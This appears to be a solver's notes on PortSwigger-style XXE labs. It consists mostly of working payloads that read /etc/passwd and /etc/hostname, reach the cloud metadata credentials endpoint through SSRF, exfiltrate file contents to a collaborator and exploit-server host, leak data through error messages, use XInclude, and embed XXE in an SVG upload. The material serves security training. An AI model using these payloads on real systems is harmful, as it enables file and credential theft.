## Lab: Exploiting XXE using external entities to retrieve files
```shell
# We create an entity which we will later reference:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# We reference it
	<productId>
		&xxe;
	</productId>
```

## Lab: Exploiting XXE to perform SSRF attacks
```shell
# We do the same as in the previous step only this time we will point to a local directory on the victim machine:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
	<productId>
		&xxe;
	</productId>
```

## Lab: Blind XXE with out-of-band interaction
```shell
# We do the same as in the previous step but this time we pass in our burp collaborator address
```

## Lab: Blind XXE with out-of-band interaction via XML parameter entities
```shell
# In this case, we can't reference the XXE entity outside its scope, so we must do it inside the DTD:
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<COLABORATOR>"> %xxe; ]>
```

## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
```shell
# in this case we are asked to display the /etc/hostname information of the victim machine, so we will use the exploit server to build the exploit and send it to them:
# inside the exploit body, we enter the following code:
<!ENTITY % file SYSTEM "file:///etc/hostname"> # We load the external entity called "file".
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>"> # Create new entity eval
%eval;
%exfil;
# We call the two entities at the end to make the exploit work.
# Once we have the exploit created, we click on Store and then view exploit --> Copy the link.
# Now we intercept the check-stock request of any item and create an XXE entity which will call the link contained in the exploit, like this:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2f00dc04dc5edcc0375d0401780054.exploit-server.net/exploit"> %xxe;]>
# Finally, we will see a request to our burp-collaborator containing the hostname of the victim machine. 
```

## Lab: Exploiting blind XXE to retrieve data via error messages
```shell
# This exercise is almost identical to the previous one. The difference is that this time we will use another XML entity called error, which will load a file that does not exist whose name contains the value of the "file" entity.
# If we enter a simple and ordinary DTD, such as: 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
# It throws an error. Therefore, we can take advantage of this "error" to display information from other files. 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">">
%eval;
%error;
# Therefore, when eval evaluates the error entity and tries to load the /nonexistent file, and since it does not exist, the error comes into play and will display the values from the /etc/passwd file. 
```

## Lab: Exploiting XInclude to retrieve files
```shell
#If we intercept the request, we can't see any XML format, so we can't use a DTD or modify the DOCTYPE, so we have to opt for XInclude. To do this,
# We include the following code inside the "productId" parameter:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Lab: Exploiting XXE via image file upload
```shell
# In this case, we know that there is a vulnerability when uploading an avatar (which can only be uploaded in SVG format), so we are going to create an SVG file with malicious code to take out the /etc/hostname. Searching, we found the following code in PayloadAllTheThings
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
# Once the image is uploaded, we go back to the post and the solution will be inside our avatar, so we open its image in a new tab and copy the code.
```
